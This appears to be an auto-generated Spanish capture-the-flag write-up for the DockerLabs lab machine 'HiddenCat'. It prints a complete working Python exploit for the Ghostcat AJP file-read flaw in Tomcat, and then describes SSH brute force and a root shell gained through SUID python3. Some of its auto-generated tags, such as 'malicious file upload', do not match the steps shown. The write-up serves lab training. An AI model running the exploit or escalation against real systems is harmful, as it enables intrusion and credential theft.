---
title: HiddenCat
node_type: machine
platform: dockerlabs
difficulty: facil
os: linux
source_path: Maquinas De Dockerlabs/Maquinas Faciles/HiddenCat.md
needs_review: false
---

<!-- AUTO-GENERATED: BanditBox knowledge base. Safe to overwrite. -->

# HiddenCat

## Resumen

HiddenCat es una maquina con preparacion particular del entorno y foco en servicios Java/Tomcat: combina enumeracion de puertos 8009/8080, inclusion/subida de archivos, credenciales y escalada local por SUID.

Fuente original: [Maquinas De Dockerlabs/Maquinas Faciles/HiddenCat.md](https://github.com/8andit0/BanditBox/blob/main/Maquinas%20De%20Dockerlabs/Maquinas%20Faciles/HiddenCat.md)

## Datos clave

| Campo | Valor |
|---|---|
| Plataforma | DockerLabs |
| Dificultad | facil |
| Sistema operativo | linux |
| Puertos detectados por texto | 8009, 8080 |
| Imagenes en fuente | 18 |
| Palabras en fuente | 2104 |
| Requiere revision | false |

## Resolucion paso a paso

>Hoy haremos una maquina sencillita, creada por el pinguino de Mario :3

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250522164537.png)

>Bien, al menos hasta la fecha de creación de este tutorial, la maquina no es funcional al iniciarla con el script de bash "auto_deploy.sh". Parece que la maquina inicia con una cantidad de descriptores de archivo insuficientes, por eso se cierra con un error:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250522165634.png)

>Y aunque nos aparezca en funcionamiento:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250522165746.png)

>No es funcional:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250522165820.png)

>Después de exprimir un buen rato la IA, descubrimos la cantidad de descriptores de archivo necesaria:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250522165947.png)

>Así que, ejecutaremos el comando para modificar la cantidad de descriptores de archivo en la terminal luego de iniciar la maquina, para que se inicie bien:

```bash
sudo docker run -d --ulimit nofile=32768:65536 hiddencat
```
1. _Con Docker run ejecutamos el contenedor a partir de una imagen_
2. _-d Nos sirve para dejar el proceso en segundo plano, y que no dependa de nuestra terminal
3. _--ulimit establece los limites de recursos para una maquina
4. _nofile=32768:65536 Especifica el numero por defecto (32768) y el numero máximo (65536) de descriptores de archivo
5. _Por ultimo hiddencat es la imagen a la que le aplicaremos los cambios

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250522171833.png)

>Ahora si, vamos a hacer un ping a la maquina para probar conexión:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250522171923.png)
_(Con esto en pocas palabras; enviamos tramas ICMP “Internet Control Message Protocol” tipo (Echo Request) a la ip victima, esta misma, al estar en funcionamiento, revisa las cabeceras del paquete para determinar que es para ella, y responde con un (Echo Reply).)

1. _Podemos ver el orden de estas tramas ICMP en el apartado “icmp_seq=”,
2. _Con el valor de “ttl=” podemos ver el número máximo de saltos que puede dar un paquete antes de descartarse (Por lo general funciona para determinar el sistema operativo víctima)
3. _Con el valor “time=” podemos ver el tiempo entre el “Echo Request” y el “Echo Reply”)

>Ya que sabemos que tenemos conexión con la maquina, escanearemos puertos, en búsqueda de servicios y sus versiones:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250524010331.png)
1. _-- min-rate 5000 (quiero tramitar mínimo 5000 paquetes por segundo) esto para que el escaneo vaya con bastante agilidad._
2. _-n (no deseo que nmap haga una resolución DNS automática)
3. _-p- (quiero escanear los 65535 puertos del sistema, no los 1000 más comunes, como normalmente hace nmap)._
4. _-Pn (Omite el descubrimiento de Host)_
5. _-sVC (Aquí se concatena el parámetro -sV que realiza un reconocimiento de versiones de servicios, y el parámetro -sC que aplica unos cuantos scripts de reconocimiento propios de nmap_

>Nos encontramos con 3 puertos abiertos; el 22 con un servicio ssh (OpenSSH 7.9), el 8009 con un servicio ajp13 (Apache Jserv), y con el 8080 con un servicio http  (Apache Tomcat 9.0.30)

>Bien, el servicio Apache Tomcat que esta en el puerto 8080 es un servidor web que corre tecnologías de Java (Es como Apache HTTPD o Nginx pero para webs en Java):

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250524011049.png)
_El servicio Tomcat, corre por defecto por el puerto 8080 con Apache, en la imagen vemos que la web nos muestra la pagina por defecto del servicio._

>Ahora bien, Cuando Tomcat se ejecuta con Apache, se necesita un procesamiento de datos desde Apache hasta el mismo Tomcat, para ello existe el puerto 8009.
>Se podría, generalizando mucho, decir que es un centro de procesamiento de datos, en donde se integran las peticiones de Apache con el servicio que presta Tomcat (Apache recibe una petición por el puerto 8080--> La petición es enviada al puerto 8009 Tomcat --> La petición es procesada y devuelta a Apache para ser mostrada al cliente).
>Para todo este proceso, se utiliza el protocolo AJP que vimos en la respuesta de nmap. Consiste en una interacción en código binario y con parámetros específicos entre Apache y Tomcat, especialmente creada para eso. Pero, aunque esta interacción se da casi siempre cuando hay un "Apache Tomcat", Esto no debería ser visible, es decir, el hecho de que el puerto 8009 este abierto ya es un fallo de seguridad.

>Buscando un poco en la web, nos encontramos con información sobre la vulnerabilidad:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250524014118.png)

>Resulta que si el puerto 8009 esta expuesto, podemos falsificar peticiones AJP en binario con código malicioso, enviarlas al puerto 8009, y este mismo responderá con el archivo que le pidamos del servicio Tomcat. Esta vulnerabilidad se llama Ghostcat y es muy conocida.
>En esta explotación se abusa de las variables "javax.servlet.include*" propias de AJP para obtener contenido de archivos que por lo general, no tenemos permitido ver desde la web. Si deseas entender la vulnerabilidad a fondo te recomiendo [esta](https://www.blackduck.com/blog/ghostcat-vulnerability-cve-2020-1938.html) lectura.

>Para explotarlo, hay un montón de scripts, como [este](https://www.exploit-db.com/exploits/48143), [este](https://github.com/YounesTasra-R4z3rSw0rd/CVE-2020-1938/blob/main/GhostCat_Exploit.py), o [este](https://github.com/dacade/CVE-2020-1938).
>_Ya que varios de los scripts daban errores y para méritos de entender del todo la vulnerabilidad, cree con ayuda de la AI uno un poco mas sencillo que los demás, que te intentare explicar un poco por encima y sin conceptos de Python para que entiendas la explotación_

>Todo el código de nuestro exploit seria este:

```python
import socket
import struct
#Primero, creamos una funcion (pack_string) que nos permita convertir a binario cualquier argumento que le demos, para que pueda ser interpretado correctamente por AJP:
def pack_string(s):
    if s is None:
        return struct.pack("!h", -1)
    s = s.encode('utf-8')
    return struct.pack("!H%dsb" % len(s), len(s), s, 0)
#Lo segundo que haremos, sera crear la funcion que construya el paquete infectado, y lo envie:
def send_forward_request(host, port, path):
    print(f"[+] Conectando a {host}:{port}")
    sock = socket.create_connection((host, port))

    # Construimos el cuerpo del mensaje AJP13 con los datos basicos que Tomcat espera:
    body = b""

    body += b"\x02"                          # Tipo de peticion ForwardRequest
    body += b"\x02"                          # METODO = GET
    body += pack_string("HTTP/1.1")          # protocolo
    body += pack_string("/")                 # URI real
    body += pack_string("127.0.0.1")         # IP del cliente
    body += pack_string("localhost")         # Host remoto
    body += pack_string("localhost")         # Nombre del servidor
    body += struct.pack("!H", 80)            # Puerto del servidor
    body += b"\x00"                          # No es SSL

    # Enviamos unas cuantas cabezeras HTTP falsas, que tomcat tambien espera:
    body += struct.pack("!H", 2)
    body += pack_string("host") + pack_string("localhost")
    body += pack_string("user-agent") + pack_string("Mozilla/5.0")

    # Con estos atrivutos enviados en binario, estariamos abusando de las variables que ya habíamos visto antes (javax.servlet.include), que son usadas para incluir contenido:
    body += b"\x0A" + pack_string("javax.servlet.include.request_uri") + pack_string("/")
    body += b"\x0A" + pack_string("javax.servlet.include.path_info") + pack_string(path)
    body += b"\x0A" + pack_string("javax.servlet.include.servlet_path") + pack_string("/")
    body += b"\xFF"  # Con esto terminamos los atrivutos

    # Las cabezeras AJP siempre comienzan por b"\x12\x34" seguidas del tamaño del paquete, asi que lo definimos para luego enviar el paquete:
    ajp_header = b"\x12\x34" + struct.pack("!H", len(body))
    packet = ajp_header + body

    sock.sendall(packet)

    # Mediante un bucle While, recibimos la respuesta he interpretamos los mensajes AJP Binarios, la dividimos entre lo que sirve y lo que no, y la parseamos.
    while True:
        header = sock.recv(4)
        if len(header) < 4:
            break

        magic, length = struct.unpack("!HH", header)
        data = sock.recv(length)

        if data[0] == 3:
            chunk_len = struct.unpack("!H", data[1:3])[0]
            print(data[3:3+chunk_len].decode(errors="ignore"), end="")
        elif data[0] == 5:
            break

    sock.close()
    print("\n[+] Fin de respuesta.")

# Puedes cam biar estos valores a tu disposicion:
HOST = "172.17.0.2"
PORT = 8009
TARGET_FILE = "/WEB-INF/web.xml"

send_forward_request(HOST, PORT, TARGET_FILE)
```

>Debemos tener en cuenta que esta vulnerabilidad nos permite leer archivos para los que no tenemos permiso dentro del mismo servicio de Tomcat, pero no es un LFI común donde podemos ver archivos del servidor.
>Es necesario buscar archivos que tengan información sensible como /manager/html, /tomcat-users.xml o /WEB-INF/web.xml.

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250524025516.png)
_El exploit nos muestra el contenido de /WEB-INF/web.xml por defecto, archivo que contiene información critica sobre la estructura de la web _

>Y funciona :3, podemos leer un archivo al que no tenemos acceso desde la web:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250524030003.png)

>Así que, como pudimos ver, el archivo anterior nos da un nombre de usuario "Jerry", podríamos buscar su contraseña mediante fuerza bruta para el servicio ssh que también esta abierto en esta maquina:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250524162214.png)
1. _-l (este parámetro se usa para determinar el usuario que ya tenemos, si no tenemos un usuario, al colocar “-L” podemos incluir una wordlist para atacarlos también)_
2. _-P (para determinar, una wordlist con posibles contraseñas, si tuviéramos una contraseña y quisiéramos probar usuarios, en este punto colocamos “-p” y la contraseña)_
3. _ssh:// (para determinar el servicio a atacar)
4. _-t (indico que deseo emplear 64 hilos, para agilizar el escaneo)_

>Encontramos con facilidad la contraseña para el usuario Jerry, procedemos a ingresar por ssh:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250524162337.png)

>Lo primero que haremos al ingresar por ssh es un tratamiento de la terminal, pera tener una Shell completamente interactiva, que no nos de problemas al ejecutar cualquier cosa:

```bash
 script /dev/null -c bash
```
_Script solicita una PTY (Pseudo terminal) al kernel, luego, ejecuta en el proceso hijo que se crea, el comando que pasamos con la flag "-c", es decir una bash. Por ultimo, script no graba nada de la sesión al redirigirlo al /dev/null (Si no esta script disponible, puedes usar Python: python3 -c 'import pty; pty.spawn("/bin/bash")')._

>Ahora, con un CTRL+Z enviamos la Reverse Shell a segundo plano y desde nuestra terminal:

```bash
stty raw -echo; fg
```
1. _stty es la herramienta que nos ayudara a cambiar los parámetros de la terminal (eco, señales, etc.)
2. _raw es la flag que nos ayudara a desactivar el procesamiento de señales como CTRL+C (para que al hacerlo la shell no muera) o CTRL+Z (para no poner en segundo plano la shell por error)
3. _-echo Desactiva el echo del teclado, que nos puede dar problemas
4. _; fg (foreground) devuelve a primer plano nuestra querida Shell O.o

>Por ultimo vamos a establecer las variables de entorno correctas para una Shell totalmente funcional:

```bash
export TERM=xterm
export SHELL=/bin/bash
```
_Le estamos diciendo a la Shell que deseamos que la variable de entorno TERM (responsable de especificar el tipo de terminal usado), sea igual a Xterm.
Sí TERM está mal establecido en la máquina, cosas como clear, nano, vim, less, no funcionan correctamente. Y luego Establecemos /bin/bash como la Shell por defecto para que otras herramientas lo usen.

>Para escalar privilegios, listaremos archivos que tengan el permiso SUID (Que se ejecutan como su propietario SIEMPRE), si encontramos un archivo cuyo propietario sea ROOT con el bit SUID activo, podremos ejecutarlo de manera privilegiada:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250524163137.png)
1. _find (comando de búsqueda en Linux)
2. _/ (búsqueda desde la raíz del sistema)
3. _-perm -4000 (De esta manera buscamos archivos que tengan solamente el Bit 4000 o SUID activo)
4. _2>/dev/null (redirige los errores o "stder" al agujero negro de Linux)
5. _"| xargs ls -lah" (le ordena al sistema que a cada iteración del primer comando, le aplique un segundo comando “ls -lah” para ver mas información)

>En la anterior respuesta nos encontramos con una mina de oro. Podemos ejecutar "/usr/bin/perl" y "/usr/bin/python3.7" como ROOT.
>Cualquiera de los 2 anteriores son binarios con la capacidad de darnos una Shell interactiva, como ambos tienen el Bit SUID activo, SIEMPRE se ejecutan con el contexto del usuario propietario (ROOT), y si abrimos una terminal desde alguno de estos binarios, será una terminal de ROOT y no de Jerry, o eso dice [GTFOBins](https://gtfobins.github.io/):

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250524164016.png)

>O

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250524164112.png)

>Vamos con Python, que siempre es un poco mas funcional:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250524164753.png)
_Importamos el modulo "os", luego usamos execl para ejecutar un comando (/bin/bash) con las flags bash y -p (Para mantener los privilegios root)_

>Y la maquina es nuestra :3


## Cadena de ataque detectada

- **Enumeration**: Apache, Connectivity check, HTTP, Nginx, Port enumeration, SSH, Tomcat
- **Initial Access**: Brute force, Local File Inclusion, Malicious file upload
- **Post Exploitation**: Credential extraction, TTY stabilization
- **Privilege Escalation**: SUID abuse, SUID binary abuse


## Tecnicas utilizadas

- [Brute force](../../../techniques/brute-force.md)
- [Connectivity check](../../../techniques/connectivity-check.md)
- [Credential extraction](../../../techniques/credential-extraction.md)
- [Local File Inclusion](../../../techniques/lfi.md)
- [Malicious file upload](../../../techniques/malicious-file-upload.md)
- [Port enumeration](../../../techniques/port-enumeration.md)
- [SUID abuse](../../../techniques/suid-abuse.md)
- [TTY stabilization](../../../techniques/tty-stabilization.md)


## Herramientas utilizadas

- [find](../../../tools/find.md)
- [GTFOBins](../../../tools/gtfobins.md)
- [Nmap](../../../tools/nmap.md)
- [Ping](../../../tools/ping.md)
- [Python](../../../tools/python.md)
- [ssh](../../../tools/ssh.md)
- [sudo](../../../tools/sudo.md)


## Servicios relacionados

- [Apache](../../../services/apache.md)
- [HTTP](../../../services/http.md)
- [Nginx](../../../services/nginx.md)
- [SSH](../../../services/ssh.md)
- [Tomcat](../../../services/tomcat.md)


## Vulnerabilidades relacionadas

- [Exposed error message](../../../vulnerabilities/exposed-error-message.md)
- [Insecure file upload](../../../vulnerabilities/insecure-file-upload.md)
- [SUID misconfiguration](../../../vulnerabilities/suid-misconfiguration.md)
- [Weak credentials](../../../vulnerabilities/weak-credentials.md)


## Metodos de escalada

- [SUID binary abuse](../../../privilege_methods/suid-binary-abuse.md)
